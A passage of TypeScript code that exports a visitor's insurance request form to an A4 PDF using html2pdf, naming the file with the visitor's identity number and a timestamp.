  container.style.width = "700px";
  document.body.appendChild(container);

  const element = container.querySelector("#pdf-content") as HTMLElement;

  const opt = {
    margin: [8, 5, 8, 5] as [number, number, number, number],
    filename: `طلب_تأمين_${visitor.identityNumber || visitor.id || "visitor"}_${Date.now()}.pdf`,
    image: { type: "jpeg" as const, quality: 0.98 },
    html2canvas: { scale: 2, useCORS: true, letterRendering: true, scrollY: 0 },
    jsPDF: { unit: "mm", format: "a4", orientation: "portrait" as const },
    pagebreak: { mode: ["avoid-all", "css", "legacy"] },
  };

  try {
    await html2pdf().set(opt).from(element).save();
  } finally {
    document.body.removeChild(container);
  }
}
